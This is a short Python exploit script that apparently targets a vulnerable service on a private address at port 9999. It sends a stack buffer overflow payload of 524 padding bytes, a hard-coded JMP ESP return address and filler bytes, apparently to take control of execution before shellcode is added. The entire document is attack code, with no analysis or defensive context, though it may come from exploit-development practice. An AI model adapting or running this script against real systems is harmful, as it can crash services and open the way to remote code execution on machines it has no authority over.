import socket
import sys
import time

# 0x311712F3 - Little Endian

aChars = 'A' * 524
jmpesp = '\xf3\x12\x17\x31'
cChars = 'C' * 4
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.5.17',9999))
    print(s.recv(1024))
    print('Trying to buffer overflow with (524 A + jmpesp + 4 C) ...')
    s.send(aChars + jmpesp + cChars)
    print(s.recv(1024))
    s.close()
except Exception:
    sys.exit()
